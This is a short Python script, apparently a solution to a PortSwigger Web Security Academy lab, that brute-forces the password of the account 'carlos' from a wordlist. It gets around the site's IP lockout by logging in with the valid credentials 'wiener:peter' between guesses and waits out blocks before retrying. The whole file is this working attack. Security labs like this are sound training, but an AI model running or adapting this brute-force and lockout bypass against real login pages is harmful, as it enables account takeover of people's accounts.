import requests
import sys
import time

url="https://0af9008203834e85c0f6bc59002c004b.web-security-academy.net/login"
username = "wiener"
proxies = {'http': 'http://127.0.0.1:8080'}


try: 
    def bruteCracking(username,url):
        count = 0
        data_dict = "username=wiener&password=peter"
        response = requests.post(url, data=data_dict, proxies=proxies)
        while("too many incorrect login attempts") in str(response.text):
            print("IP blocked ! retrying the bruteforce after one minute")
            print(response.text)
            time.sleep(60)
            response = requests.post(url, data=data_dict, proxies=proxies)
        for password in passwords:
            password = password.strip()
            count = count + 1
            if(count == 2 ):
                data_dict = "username=wiener&password=peter"
                response = requests.post(url, data=data_dict, proxies=proxies)
                count=0
                pass
            print("Trying Password: "+ password)
            data_dict = "username=carlos&password="+password
            response = requests.post(url, data=data_dict, proxies=proxies)
            if "Incorrect password" in str(response.text):
                pass
            if "carlos" in str(response.text):
                print("the correct password is :  " + password)
                sys.exit()
                    
except:
    print("Some Error Occurred Please Check Your Internet Connection !!")

with open("passwords.txt", "r") as passwords:
    bruteCracking(username,url)


